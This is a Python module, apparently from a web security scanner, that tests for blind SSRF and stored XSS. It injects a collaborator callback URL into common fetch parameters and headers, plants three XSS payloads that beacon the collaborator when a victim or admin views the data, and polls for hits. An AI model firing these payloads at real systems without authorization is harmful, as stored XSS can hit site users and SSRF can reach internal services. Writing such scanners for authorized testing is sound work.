"""blind_oob — blind SSRF / blind XSS / OOB injection via a collaborator.

Opt-in: requires opts['collaborator'] = base URL of a running collaborator.py
that the TARGET can reach. Plants OOB payloads, waits briefly, then polls the
collaborator for interactions. Blind XSS is stored — it may fire later when a
victim/admin views the data, so also check the collaborator dashboard afterward.
"""
import json
import time
import urllib.parse
import urllib.request
import uuid
from common import Finding

NAME = "blind_oob"

FETCH_PARAMS = ["url", "uri", "link", "src", "callback", "webhook", "feed",
                "image", "img", "load", "next", "return", "dest", "target"]


def _poll(collab, token, timeout=5):
    """Return list of hits for token, waiting up to `timeout` seconds."""
    deadline = time.time() + timeout
    url = collab.rstrip("/") + "/__hits/" + token
    while time.time() < deadline:
        try:
            with urllib.request.urlopen(url, timeout=5) as resp:
                hits = json.loads(resp.read().decode())
                if hits:
                    return hits
        except Exception:
            pass
        time.sleep(1)
    return []


def run(client, opts):
    collab = opts.get("collaborator")
    if not collab:
        return []  # opt-in; silent when not configured
    method = opts.get("method", "GET").upper()
    param = opts.get("param")
    base = str(opts.get("base_value", "1"))
    out = []
    planted = []  # (vector, token)

    def payload_url(token, tag):
        return f"{collab.rstrip('/')}/{token}/{tag}"

    # 1) Blind SSRF — inject collaborator URL into likely fetch params + headers
    ssrf_token = uuid.uuid4().hex[:12]
    pu = payload_url(ssrf_token, "ssrf")
    params_to_try = ([param] if param else []) + FETCH_PARAMS
    for p in params_to_try[:8]:
        try:
            if method == "GET":
                client.request("GET", params={p: pu})
            else:
                client.request("POST", data={p: pu})
        except Exception:
            pass
    # also common SSRF-via-header sinks
    for h in ["Referer", "X-Forwarded-For", "True-Client-IP", "X-Wap-Profile"]:
        try:
            client.request("GET", extra_headers={h: pu})
        except Exception:
            pass
    planted.append(("blind SSRF (fetch params/headers)", ssrf_token))

    # 2) Blind/stored XSS — plant a script tag that beacons the collaborator
    if param:
        xss_token = uuid.uuid4().hex[:12]
        xu = payload_url(xss_token, "xss")
        xss_payloads = [
            f'"><script src={xu}></script>',
            f"'><img src=x onerror=\"new Image().src='{xu}'\">",
            f"</textarea><script src={xu}></script>",
        ]
        for pl in xss_payloads:
            try:
                if method == "GET":
                    client.request("GET", params={param: pl})
                else:
                    client.request("POST", data={param: pl})
            except Exception:
                pass
        planted.append(("blind/stored XSS", xss_token))

    # Poll for confirmed interactions
    for vector, token in planted:
        hits = _poll(collab, token, timeout=6)
        if hits:
            h = hits[0]
            out.append(Finding(NAME, "critical", f"Confirmed OOB interaction — {vector}",
                               f"target contacted the collaborator ({len(hits)} hit(s))",
                               f"{h.get('method')} {h.get('path')} from {h.get('client')}"))
        elif vector.startswith("blind/stored XSS"):
            out.append(Finding(NAME, "info", "Blind XSS payload planted",
                               "no immediate beacon — stored XSS may fire later; "
                               f"watch the collaborator for token {token}", token))
    return out
